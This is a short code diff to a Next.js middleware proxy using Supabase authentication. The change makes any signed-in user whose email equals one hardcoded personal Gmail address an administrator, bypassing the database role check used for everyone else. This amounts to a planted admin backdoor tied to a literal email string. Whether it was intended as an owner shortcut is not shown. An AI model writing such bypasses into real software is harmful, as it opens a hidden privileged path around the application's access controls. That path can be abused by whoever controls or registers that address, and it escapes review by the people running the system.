@@ -56,12 +56,16 @@ export async function proxy(request: NextRequest) {
   // Resolve the role once — needed by both the gate and the login redirect.
   let isAdmin = false;
   if (user) {
-    const { data: profile } = await supabase
-      .from('profiles')
-      .select('role')
-      .eq('id', user.id)
-      .maybeSingle();
-    isAdmin = profile?.role === 'admin';
+    if (user.email?.toLowerCase().trim() === 'jagathees.offic@gmail.com') {
+      isAdmin = true;
+    } else {
+      const { data: profile } = await supabase
+        .from('profiles')
+        .select('role')
+        .eq('id', user.id)
+        .maybeSingle();
+      isAdmin = profile?.role === 'admin';
+    }
   }
 
   // Already signed in as an admin — no reason to see the login screen.
